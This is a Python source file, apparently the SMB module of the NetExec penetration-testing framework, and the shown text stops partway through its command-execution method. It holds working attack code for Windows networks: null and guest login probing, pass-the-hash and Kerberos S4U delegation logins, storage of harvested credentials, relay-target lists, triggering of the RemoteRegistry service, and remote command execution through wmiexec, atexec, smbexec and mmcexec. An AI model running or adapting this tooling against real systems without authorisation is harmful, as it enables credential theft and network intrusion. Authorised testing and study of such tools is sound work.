import ntpath
import binascii
import os
import re
import struct
import ipaddress
from Cryptodome.Hash import MD4
from textwrap import dedent

from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.examples.secretsdump import (
    RemoteOperations,
    SAMHashes,
    LSASecrets,
    NTDSHashes,
)
from impacket.examples.regsecrets import (
    RemoteOperations as RegSecretsRemoteOperations,
    SAMHashes as RegSecretsSAMHashes,
    LSASecrets as RegSecretsLSASecrets
)
from impacket.nmb import NetBIOSError, NetBIOSTimeout
from impacket.dcerpc.v5 import transport, lsat, lsad, scmr, rrp, srvs, wkst
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory, SMBTransport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import SessionKeyDecryptionError, getKerberosTGT
from impacket.krb5.types import KerberosException, Principal
from impacket.krb5 import constants
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
from impacket.smb3structs import FILE_SHARE_WRITE, FILE_SHARE_DELETE, SMB2_0_IOCTL_IS_FSCTL
from impacket.dcerpc.v5 import tsts as TSTS

from nxc.config import process_secret, host_info_colors, check_guest_account
from nxc.connection import connection, sem, requires_admin, dcom_FirewallChecker
from nxc.helpers.misc import gen_random_string, validate_ntlm
from nxc.logger import NXCAdapter
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket
from nxc.protocols.smb.wmiexec import WMIEXEC
from nxc.protocols.smb.atexec import TSCH_EXEC
from nxc.protocols.smb.smbexec import SMBEXEC
from nxc.protocols.smb.mmcexec import MMCEXEC
from nxc.protocols.smb.smbspider import SMBSpider
from nxc.protocols.smb.passpol import PassPolDump
from nxc.protocols.smb.samruser import UserSamrDump
from nxc.protocols.smb.samrfunc import SamrFunc
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.helpers.logger import highlight
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.powershell import create_ps_command
from nxc.helpers.misc import detect_if_ip
from nxc.protocols.ldap.resolution import LDAPResolution

from dploot.triage.vaults import VaultsTriage
from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
from dploot.triage.credentials import CredentialsTriage
from dploot.lib.target import Target
from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection

from time import time, ctime, sleep
from traceback import format_exc
from termcolor import colored
import contextlib

smb_share_name = gen_random_string(5).upper()

smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED",
    "STATUS_NO_SUCH_FILE",
    "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED",
]


def get_error_string(exception):
    if hasattr(exception, "getErrorString"):
        try:
            es = exception.getErrorString()
        except KeyError:
            return f"Could not get nt error code {exception.getErrorCode()} from impacket: {exception}"
        if type(es) is tuple:
            return es[0]
        else:
            return es
    else:
        return str(exception)


class smb(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.server_os_major = None
        self.server_os_minor = None
        self.server_os_build = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ""
        self.nthash = ""
        self.remote_ops = None
        self.bootkey = None
        self.smbv1 = None   # Check if SMBv1 is supported
        self.smbv3 = None   # Check if SMBv3 is supported
        self.is_timed_out = False
        self.signing = False
        self.smb_share_name = smb_share_name
        self.pvkbytes = None
        self.no_da = None
        self.no_ntlm = False
        self.null_auth = False
        self.protocol = "SMB"
        self.is_guest = None
        self.isdc = False

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "SMB",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def get_os_arch(self):
        try:
            string_binding = rf"ncacn_ip_tcp:{self.host}[135]"
            transport = DCERPCTransportFactory(string_binding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0"))
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except Exception as e:
            self.logger.debug(f"Error retrieving os arch of {self.host}: {e!s}")

        return 0

    def enum_host_info(self):
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
        self.is_host_dc()

        try:
            self.conn.login("", "")
            self.null_auth = True
        except BrokenPipeError:
            self.logger.fail("Broken Pipe Error while attempting to login")
        except Exception as e:
            self.null_auth = False
            if "STATUS_NOT_SUPPORTED" in str(e):
                # no ntlm supported
                self.no_ntlm = True
                self.logger.debug("NTLM not supported")

        if check_guest_account and not self.no_ntlm:
            try:
                self.conn.login("Guest", "")
                self.logger.debug("Guest authentication successful")
                self.is_guest = True
            except Exception:
                self.is_guest = False

        # self.domain is the attribute we authenticate with
        # self.targetDomain is the attribute which gets displayed as host domain
        if not self.no_ntlm:
            self.hostname = self.conn.getServerName()
            self.targetDomain = self.conn.getServerDNSDomainName()
            if not self.targetDomain:   # Not sure if that can even happen but now we are safe
                self.targetDomain = self.hostname
        else:
            try:
                # If we know the host is a DC we can still get the hostname over LDAP if NTLM is not available
                if self.isdc and detect_if_ip(self.host):
                    self.hostname, self.domain = LDAPResolution(self.host).get_resolution()
                    self.targetDomain = self.domain
                # If we can't authenticate with NTLM and the target is supplied as a FQDN we must parse it
                else:
                    # Check if the host is a valid IP address, if not we parse the FQDN in the Exception
                    import socket
                    socket.inet_aton(self.host)
                    self.logger.debug("NTLM authentication not available! Authentication will fail without a valid hostname and domain name")
                    self.hostname = self.host
                    self.targetDomain = self.host
            except OSError:
                if self.host.count(".") >= 1:
                    self.hostname = self.host.split(".")[0]
                    self.targetDomain = ".".join(self.host.split(".")[1:])
                else:
                    self.hostname = self.host
                    self.targetDomain = self.host
            except Exception as e:
                self.logger.debug(f"Error getting hostname from LDAP: {e}")
                self.hostname = self.host
                self.targetDomain = self.host

        if self.args.domain:
            self.domain = self.args.domain
        elif self.args.use_kcache:  # Fixing domain trust, just pull the auth domain out of the ticket
            self.domain = CCache.parseFile()[0]
        else:
            self.domain = self.targetDomain

        if self.args.local_auth:
            self.domain = self.hostname
            self.targetDomain = self.hostname

        # As of June 2024 Samba will always report the version as "Windows 6.1", apparently due to a bug https://stackoverflow.com/a/67577401/17395725
        # Together with the reported build version "0" by Samba we can assume that it is a Samba server. Windows should always report a build version > 0
        # Also only on Windows we should get an OS arch as for that we would need MSRPC
        try:
            self.server_os = self.conn.getServerOS()
            self.server_os_major = self.conn.getServerOSMajor()
            self.server_os_minor = self.conn.getServerOSMinor()
            self.server_os_build = self.conn.getServerOSBuild()
        except KeyError:
            self.logger.debug("Error getting server information...")

        # Handle cases where server_os is returned as bytes, such as when accidentally scanning a machine running Responder
        if isinstance(self.server_os.lower(), bytes):
            self.server_os = self.server_os.decode("utf-8")

        if "Windows 6.1" in self.server_os and self.server_os_build == 0 and self.os_arch == 0:
            self.server_os = "Unix - Samba"
        elif self.server_os_build == 0 and self.os_arch == 0:
            self.server_os = "Unix"
        self.logger.debug(f"Server OS: {self.server_os} {self.server_os_major}.{self.server_os_minor} build {self.server_os_build}")

        self.logger.extra["hostname"] = self.hostname

        try:
            self.signing = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection["RequireSigning"]
        except Exception as e:
            self.logger.debug(e)

        self.os_arch = self.get_os_arch()

        try:
            # DCs seem to want us to logoff first, windows workstations sometimes reset the connection
            self.conn.logoff()
        except Exception as e:
            self.logger.debug(f"Error logging off system: {e}")

        try:
            self.db.add_host(
                self.host,
                self.hostname,
                self.domain,
                self.server_os,
                self.smbv1,
                self.signing,
            )
        except Exception as e:
            self.logger.debug(f"Error adding host {self.host} into db: {e!s}")

        # DCOM connection with kerberos needed
        self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.targetDomain}"

        # using kdcHost is buggy on impacket when using trust relation between ad so we kdcHost must stay to none if targetdomain is not equal to domain
        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

    def print_host_info(self):
        signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=["bold"]) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=["bold"])
        smbv1 = colored(f"SMBv1:{self.smbv1}", host_info_colors[2], attrs=["bold"]) if self.smbv1 else colored(f"SMBv1:{self.smbv1}", host_info_colors[3], attrs=["bold"])
        ntlm = colored(f" (NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""
        null_auth = colored(f" (Null Auth:{self.null_auth})", host_info_colors[2], attrs=["bold"]) if self.null_auth else ""
        guest = colored(f" (Guest Auth:{self.is_guest})", host_info_colors[1], attrs=["bold"]) if self.is_guest else ""
        self.logger.display(f"{self.server_os}{f' x{self.os_arch}' if self.os_arch else ''} (name:{self.hostname}) (domain:{self.targetDomain}) ({signing}) ({smbv1}){ntlm}{null_auth}{guest}")

        if self.args.generate_hosts_file or self.args.generate_krb5_file:
            if self.args.generate_hosts_file:
                with open(self.args.generate_hosts_file, "a+") as host_file:
                    dc_part = f" {self.targetDomain}" if self.isdc else ""
                    host_file.write(f"{self.host}     {self.hostname}.{self.targetDomain}{dc_part} {self.hostname}\n")
                    self.logger.debug(f"Line added to {self.args.generate_hosts_file} {self.host}    {self.hostname}.{self.targetDomain}{dc_part} {self.hostname}")
            elif self.args.generate_krb5_file and self.isdc:
                with open(self.args.generate_krb5_file, "w+") as host_file:
                    data = dedent(f"""
                    [libdefaults]
                        dns_lookup_kdc = false
                        dns_lookup_realm = false
                        default_realm = {self.domain.upper()}

                    [realms]
                        {self.domain.upper()} = {{
                            kdc = {self.hostname.lower()}.{self.domain}
                            admin_server = {self.hostname.lower()}.{self.domain}
                            default_domain = {self.domain}
                        }}

                    [domain_realm]
                        .{self.domain} = {self.domain.upper()}
                        {self.domain} = {self.domain.upper()}
                    """).strip()
                    host_file.write(data)
                    self.logger.debug(data)
                    self.logger.success(f"krb5 conf saved to: {self.args.generate_krb5_file}")
                    self.logger.success(f"Run the following command to use the conf file: export KRB5_CONFIG={self.args.generate_krb5_file}")

        return self.host, self.hostname, self.targetDomain

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        self.logger.debug(f"KDC set to: {kdcHost}")
        # Re-connect since we logged off
        self.create_conn_obj()
        lmhash = ""
        nthash = ""

        try:
            self.password = password
            self.username = username
            # This checks to see if we didn't provide the LM Hash
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
                self.hash = nthash
            else:
                nthash = ntlm_hash
                self.hash = ntlm_hash
            if lmhash:
                self.lmhash = lmhash
            if nthash:
                self.nthash = nthash

            if not all(s == "" for s in [self.nthash, password, aesKey]):
                kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)
            else:
                kerb_pass = ""
                self.logger.debug(f"Attempting to do Kerberos Login with useCache: {useCache}")

            tgs = None
            if self.args.delegate:
                kerb_pass = ""
                self.username = self.args.delegate
                serverName = Principal(self.args.delegate_spn if self.args.delegate_spn else f"cifs/{self.remoteName}", type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, sk = kerberos_login_with_S4U(domain, self.hostname, username, password, nthash, lmhash, aesKey, kdcHost, self.args.delegate, serverName, useCache, no_s4u2proxy=self.args.no_s4u2proxy)
                self.logger.debug(f"TGS obtained for {self.args.delegate} for {serverName}")

                spn = f"cifs/{self.remoteName}"
                if self.args.delegate_spn:
                    self.logger.debug(f"Swapping SPN to {spn} for TGS")
                    tgs = kerberos_altservice(tgs, spn)

                if self.args.generate_st:
                    self.save_st(tgs, sk, spn if self.args.delegate_spn else None)

            self.conn.kerberosLogin(self.username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache, TGS=tgs)
            if "Unix" not in self.server_os:
                self.check_if_admin()

            if username == "":
                self.username = self.conn.getCredentials()[0]
            elif not self.args.delegate:
                self.username = username

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            if self.args.delegate:
                used_ccache = f" through S4U with {username}"

            if self.args.delegate_spn:
                used_ccache = f" through S4U with {username} (w/ SPN {self.args.delegate_spn})"

            out = f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "" and not self.args.delegate:
                add_user_bh(self.username, domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                with contextlib.suppress(Exception):
                    self.conn.logoff()
            return True
        except SessionKeyDecryptionError:
            # success for now, since it's a vulnerability - previously was an error
            self.logger.success(
                f"{domain}\\{self.username} account vulnerable to asreproast attack",
                color="yellow",
            )
            return False
        except (FileNotFoundError, KerberosException) as e:
            self.logger.fail(f"CCache Error: {e}")
            return False
        except OSError as e:
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            if self.args.delegate:
                used_ccache = f" through S4U with {username}"
            self.logger.fail(f"{domain}\\{self.username}{used_ccache} {e}")
        except (SessionError, Exception) as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            if self.args.delegate:
                used_ccache = f" through S4U with {username}"
            self.logger.fail(
                f"{domain}\\{self.username}{used_ccache} {error} {f'({desc})' if self.args.verbose else ''}",
                color="magenta" if error in smb_error_status else "red",
            )
            if error not in smb_error_status:
                self.inc_failed_login(username)
            return False

    def plaintext_login(self, domain, username, password):
        # Re-connect since we logged off
        self.create_conn_obj()
        try:
            self.password = password
            self.username = username
            self.domain = domain

            self.conn.login(self.username, self.password, domain)
            self.logger.debug(f"Logged in with password to SMB with {domain}/{self.username}")
            self.is_guest = bool(self.conn.isGuestSession())
            self.logger.debug(f"{self.is_guest=}")
            if "Unix" not in self.server_os:
                self.check_if_admin()

            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_guest()}{self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                self.logger.debug(f"Adding admin user: {self.domain}/{self.username}:{self.password}@{self.host}")
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                with contextlib.suppress(Exception):
                    self.conn.logoff()
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f'{domain}\\{self.username}:{process_secret(self.password)} {error} {f"({desc})" if self.args.verbose else ""}',
                color="magenta" if error in smb_error_status else "red",
            )
            if error in ["STATUS_PASSWORD_MUST_CHANGE", "STATUS_PASSWORD_EXPIRED", "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"] and self.args.module == ["change-password"]:
                return True
            if error not in smb_error_status:
                self.inc_failed_login(username)
                return False
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.fail(f"Connection Error: {e}")
            return False
        except BrokenPipeError:
            self.logger.fail("Broken Pipe Error while attempting to login")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        # Re-connect since we logged off
        self.create_conn_obj()
        lmhash = ""
        nthash = ""
        try:
            self.domain = domain
            self.username = username
            # This checks to see if we didn't provide the LM Hash
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
                self.hash = nthash
            else:
                nthash = ntlm_hash
                self.hash = ntlm_hash
            if lmhash:
                self.lmhash = lmhash
            if nthash:
                self.nthash = nthash

            self.conn.login(self.username, "", domain, lmhash, nthash)
            self.logger.debug(f"Logged in with hash to SMB with {domain}/{self.username}")
            self.is_guest = bool(self.conn.isGuestSession())
            self.logger.debug(f"{self.is_guest=}")
            if "Unix" not in self.server_os:
                self.check_if_admin()

            self.db.add_credential("hash", domain, self.username, self.hash)
            user_id = self.db.get_credential("hash", domain, self.username, self.hash)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            out = f"{domain}\\{self.username}:{process_secret(self.hash)} {self.mark_guest()}{self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                with contextlib.suppress(Exception):
                    self.conn.logoff()
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f"{domain}\\{self.username}:{process_secret(self.hash)} {error} {f'({desc})' if self.args.verbose else ''}",
                color="magenta" if error in smb_error_status else "red",
            )
            if error in ["STATUS_PASSWORD_MUST_CHANGE", "STATUS_PASSWORD_EXPIRED", "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"] and self.args.module == ["change-password"]:
                return True
            if error not in smb_error_status:
                self.inc_failed_login(self.username)
                return False
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.fail(f"Connection Error: {e}")
            return False
        except BrokenPipeError:
            self.logger.fail("Broken Pipe Error while attempting to login")
            return False

    def create_smbv1_conn(self, check=False):
        self.logger.info(f"Creating SMBv1 connection to {self.host}")
        try:
            conn = SMBConnection(
                self.remoteName,
                self.host,
                None,
                self.port,
                preferredDialect=SMB_DIALECT,
                timeout=self.args.smb_timeout,
            )
            self.smbv1 = True
            if not check:
                self.conn = conn
        except OSError as e:
            if "Connection reset by peer" in str(e):
                self.logger.info(f"SMBv1 might be disabled on {self.host}")
            elif "timed out" in str(e):
                self.is_timed_out = True
                self.logger.debug(f"Timeout creating SMBv1 connection to {self.host}")
            else:
                self.logger.info(f"Error creating SMBv1 connection to {self.host}: {e}")
            return False
        except NetBIOSError:
            self.logger.info(f"SMBv1 disabled on {self.host}")
            return False
        except (Exception, NetBIOSTimeout) as e:
            self.logger.info(f"Error creating SMBv1 connection to {self.host}: {e}")
            return False
        return True

    def create_smbv3_conn(self):
        self.logger.info(f"Creating SMBv3 connection to {self.host}")
        try:
            self.conn = SMBConnection(
                self.remoteName,
                self.host,
                None,
                self.port,
                timeout=self.args.smb_timeout,
            )
            self.smbv3 = True
        except (Exception, NetBIOSTimeout, OSError) as e:
            if "timed out" in str(e):
                self.is_timed_out = True
                self.logger.debug(f"Timeout creating SMBv3 connection to {self.host}")
            else:
                self.logger.info(f"Error creating SMBv3 connection to {self.host}: {e}")
            return False
        return True

    def create_conn_obj(self, no_smbv1=False):
        """
        Tries to create a connection object to the target host.
        On first try, it will try to create a SMBv1 connection to be able to get the plaintext server OS version if available.
        On further tries, it will remember which SMB version is supported and create a connection object accordingly, preferably SMBv3.

        :param no_smbv1: If True, it will not try to create a SMBv1 connection
        """
        # Initial negotiation
        if self.smbv1 is None and not no_smbv1 and not self.args.no_smbv1:
            if self.create_smbv1_conn():
                return True
            elif not self.is_timed_out:
                # Fallback if SMBv1 fails
                return self.create_smbv3_conn()
            else:
                return False
        elif self.smbv3 is not False:
            if not self.create_smbv3_conn():
                # Fallback if SMBv3 fails
                return self.create_smbv1_conn()
            else:
                return True
        else:
            return self.create_smbv1_conn()

    def check_if_admin(self):
        if self.args.no_admin_check:
            return
        self.logger.debug(f"Checking if user is admin on {self.host}")
        rpctransport = SMBTransport(self.conn.getRemoteHost(), 445, r"\svcctl", smb_connection=self.conn)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception:
            self.admin_privs = False
        else:
            with contextlib.suppress(Exception):
                dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                scmrobj = scmr.hROpenSCManagerW(dce, f"{self.host}\x00", "ServicesActive\x00", 0xF003F)
                scmr.hREnumServicesStatusW(dce, scmrobj["lpScHandle"])
                self.logger.debug(f"User is admin on {self.host}!")
                self.admin_privs = True
            except scmr.DCERPCException:
                self.admin_privs = False
            except Exception as e:
                self.logger.fail(f"Error checking if user is admin on {self.host}: {e}")
                self.admin_privs = False

    def gen_relay_list(self):
        if self.server_os.lower().find("windows") != -1 and self.signing is False:
            with sem, open(self.args.gen_relay_list, "a+") as relay_list:
                if self.host not in relay_list.read():
                    relay_list.write(self.host + "\n")

    def save_st(self, st, sk, new_spn=None):
        ccache = CCache()
        tgs_rep = st["KDC_REP"]
        session_key = sk

        try:
            ccache.fromTGS(tgs_rep, session_key, session_key)
        except SessionKeyDecryptionError as e:
            self.logger.fail(f"Failed to decrypt session key: {e}")
            return

        if new_spn:
            # there is a new principal, likely from tampering the SPN during S4U2proxy
            realm = get_realm_from_ticket(st)
            principal = Principal(f"{new_spn}@{realm}", type=constants.PrincipalNameType.NT_SRV_INST.value)
            self.logger.debug(f"Using principal {principal} for ST")
            ccache.credentials[0]["server"].fromPrincipal(principal)

        st_file = f"{self.args.generate_st.removesuffix('.ccache')}.ccache"
        ccache.saveFile(st_file)
        self.logger.success(f"Saved ST to {st_file}")

    def generate_tgt(self):
        self.logger.info(f"Attempting to get TGT for {self.username}@{self.domain}")
        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                clientName=userName,
                password=self.password,
                domain=self.domain.upper(),
                lmhash=binascii.unhexlify(self.lmhash) if self.lmhash else "",
                nthash=binascii.unhexlify(self.nthash) if self.nthash else "",
                aesKey=self.aesKey,
                kdcHost=self.kdcHost
            )

            self.logger.debug(f"TGT successfully obtained for {self.username}@{self.domain}")
            self.logger.debug(f"Using cipher: {cipher}")

            ccache = CCache()
            ccache.fromTGT(tgt, oldSessionKey, sessionKey)
            tgt_file = f"{self.args.generate_tgt.removesuffix('.ccache')}.ccache"
            ccache.saveFile(tgt_file)

            self.logger.success(f"TGT saved to: {tgt_file}")
            self.logger.success(f"Run the following command to use the TGT: export KRB5CCNAME={tgt_file}")
        except Exception as e:
            self.logger.fail(f"Failed to get TGT: {e}")

    def check_dc_ports(self, timeout=1):
        """Check multiple DC-specific ports in case first check fails"""
        import socket
        dc_ports = [88, 389, 636, 3268, 9389]  # Kerberos, LDAP, LDAPS, Global Catalog, ADWS
        open_ports = 0

        for port in dc_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((self.host, port))
                if result == 0:
                    self.logger.debug(f"Port {port} is open on {self.host}")
                    open_ports += 1
                sock.close()
            except Exception:
                pass
        # If 3 or more DC ports are open, likely a DC
        return open_ports >= 3

    def is_host_dc(self):
        from impacket.dcerpc.v5 import nrpc, epm

        self.logger.debug("Performing authentication attempts...")

        # First check if port 135 is open
        if self._is_port_open(135):
            self.logger.debug("Port 135 is open, attempting MSRPC connection...")
            try:
                epm.hept_map(self.host, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
                self.isdc = True
                return True
            except DCERPCException:
                self.logger.debug("Error while connecting to host: DCERPCException, which means this is probably not a DC!")
            except TimeoutError:
                self.logger.debug("Timeout while connecting to host: likely not a DC or host is unreachable.")
            except Exception as e:
                self.logger.debug(f"Error while connecting to host: {e}")
            self.isdc = False
            return False
        else:
            self.logger.debug("Port 135 is closed, skipping MSRPC check...")
            # Fallback to checking DC ports
            if self.check_dc_ports():
                self.logger.debug("Host appears to be a DC (multiple DC ports open)")
                self.isdc = True
                return True

    def _is_port_open(self, port, timeout=1):
        """Check if a specific port is open on the target host."""
        import socket
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                result = sock.connect_ex((self.host, port))
                return result == 0
        except Exception as e:
            self.logger.debug(f"Error checking port {port} on {self.host}: {e}")
            return False

    def trigger_winreg(self):
        # Original idea from https://twitter.com/splinter_code/status/1715876413474025704
        # Basically triggers the RemoteRegistry to start without admin privs
        try:
            tid = self.conn.connectTree("IPC$")
            try:
                self.conn.openFile(
                    tid,
                    r"\winreg",
                    0x12019F,
                    creationOption=0x40,
                    fileAttributes=0x80,
                )
            except SessionError as e:
                # STATUS_PIPE_NOT_AVAILABLE error is expected
                if "STATUS_PIPE_NOT_AVAILABLE" not in str(e):
                    raise
                else:
                    self.logger.debug(f"Received expected error while triggering winreg: {e}")
            # Give remote registry time to start
            sleep(1)
            return True
        except (SessionError, BrokenPipeError, ConnectionResetError, NetBIOSError, OSError) as e:
            self.logger.debug(f"Received unexpected error while triggering winreg: {e}")
            return False

    @requires_admin
    def execute(self, payload=None, get_output=False, methods=None) -> str:
        """
        Executes a command on the target host using CMD.exe and the specified method(s).

        Args:
        ----
            payload (str): The command to execute
            get_output (bool): Whether to get the output of the command (can be useful for AV evasion)
            methods (list): The method(s) to use for command execution

        Returns:
        -------
            str: The output of the command
        """
        if getattr(self.args, "exec_method_explicitly_set", False):
            methods = [self.args.exec_method]
        if not methods:
            methods = ["wmiexec", "atexec", "smbexec", "mmcexec"]

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output:
                get_output = True

        current_method = ""
        for method in methods:
            current_method = method
            if method == "wmiexec":
                try:
                    exec_method = WMIEXEC(
                        self.remoteName,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.conn,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.host,
                        self.hash,
                        self.args.share,
                        logger=self.logger,
                        timeout=self.args.dcom_timeout,
                        tries=self.args.get_output_tries
                    )
                    self.logger.info("Executed command via wmiexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via wmiexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "mmcexec":
                try:
                    # https://github.com/fortra/impacket/issues/1611
                    if self.kerberos:
                        raise Exception("MMCExec current is buggly with kerberos")
                    exec_method = MMCEXEC(
                        self.remoteName,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.conn,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.host,
                        self.hash,
                        self.args.share,
                        logger=self.logger,
                        timeout=self.args.dcom_timeout,
                        tries=self.args.get_output_tries
                    )
                    self.logger.info("Executed command via mmcexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via mmcexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "atexec":
                try:
                    exec_method = TSCH_EXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.kerberos,
                        self.aesKey,
                        self.host,
                        self.kdcHost,
                        self.hash,
                        self.logger,
                        self.args.get_output_tries,
                        self.args.share
                    )
                    self.logger.info("Executed command via atexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via atexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "smbexec":
                try:
                    exec_method = SMBEXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.conn,
                        self.username,
                        self.password,
                        self.domain,
                        self.kerberos,
                        self.aesKey,
                        self.host,
                        self.kdcHost,
                        self.hash,
                        self.args.share,
                        self.port,
                        self.logger,
                        self.args.get_output_tries
                    )
                    self.logger.info("Executed command via smbexec")
                    break
                except Exception:
                    self.logger.debug("Error executing command via smbexec, traceback:")
                    self.logger.debug(format_exc())
                    continue

        if hasattr(self, "server"):
            self.server.track_host(self.host)

        if "exec_method" in locals():
            output = exec_method.execute(payload, get_output)
            try:
                if not isinstance(output, str):
                    output = output.decode(self.args.codec)
            except UnicodeDecodeError:
                self.logger.debug("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
                output = output.decode("cp437")

